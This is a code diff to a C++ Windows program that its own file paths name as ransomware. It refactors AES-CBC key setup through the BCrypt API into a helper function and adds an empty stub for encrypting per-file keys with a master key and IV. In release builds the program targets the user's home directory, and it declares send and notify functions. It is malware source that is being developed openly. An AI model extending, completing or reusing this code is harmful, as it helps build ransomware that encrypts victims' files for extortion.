@@ -11,6 +11,9 @@ string get_username();
 string get_home();
 void send();
 void notify();
+
+
+
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 
 
@@ -18,7 +21,7 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans.txt";
+	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
 #else
 	string path = get_home();
 #endif
@@ -40,6 +43,12 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
+void encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
+{
+	DWORD status;
+	
+	
+}
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 {
@@ -82,6 +91,34 @@ void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE iv, PBYTE
 	ofile.close();
 }
 
+DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
+{
+	DWORD status;
+
+	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
+	if(!NT_SUCCESS(status)) {
+		return status;
+	}
+	ULONG res;
+	char blockLen[50] ={0};
+	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
+	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
+	if (!NT_SUCCESS(status)) {
+		std::cout << "BAD KEY HANDLE" << std::endl;
+		return status;
+
+	}
+
+	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
+	return status;
+}
+
 void encrypt(string path) 
 {
 	DWORD status;
@@ -108,27 +145,9 @@ void encrypt(string path)
 	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
 	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
 #endif
-	
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
-	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
-	if(!NT_SUCCESS(status)) {
-		//TODO cleanup
-	}
-	ULONG res;
-	char blockLen[50] ={0};
-	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
-	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
-	}
-	//TODO verify compatible block length
 	BCRYPT_KEY_HANDLE keyHandle;
-	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
-	if (!NT_SUCCESS(status)) {
-		std::cout << "BAD KEY HANDLE" << std::endl;
-		//TODO cleanup
-	}
-
-	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+	status = getKeyHandle(key, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
 		//TODO cleanup
 	}
